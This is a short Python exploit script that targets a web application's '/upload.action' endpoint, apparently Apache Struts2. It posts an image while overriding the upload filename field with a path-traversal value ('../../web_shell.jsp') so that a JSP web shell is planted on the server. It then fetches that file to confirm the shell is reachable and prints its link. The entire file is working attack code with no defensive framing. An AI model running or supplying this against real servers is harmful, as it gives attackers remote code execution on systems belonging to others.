import requests

class Upload:
    def __init__(self, target: str):
        self.target = target
        self.filename = "img.png"
        self.exploit_file = "web_shell.jsp"


    def upload_file(self): 
        url = f"{self.target}/upload.action"
        
        headers = {
            "User-Agent": "Mozilla/5.0",
        }
        files = {
            "Upload": (self.filename, open(self.filename, "rb"), "image/png"),
            "top.UploadFileName": (None, f"../../{self.exploit_file}")
        }

        response = requests.post(url, headers=headers, files=files)

        if response.status_code == 200 or response.status_code == 500:
            success = self.search_by_exploit_file()
            if success:
                return True
        else:
            print(f"Exploit failed with status code {response.status_code}")
            return False
        
    def search_by_exploit_file(self):
        file_exist = False

        url = f"{self.target}{self.exploit_file}"

        response = requests.get(url)

        if response.status_code == 200 or response.status_code == 500:
            file_exist = True
            print("\n\n\033[1;32m============================================================================================+\033[0m")
            print("+ Link:", f"\033[1;34m{url}\033[0m")
            print("\033[1;32m============================================================================================+\033[0m")
            print("\033[1;34m\033[0m")
            return file_exist
        
        else:
            print("File not found")
            return file_exist
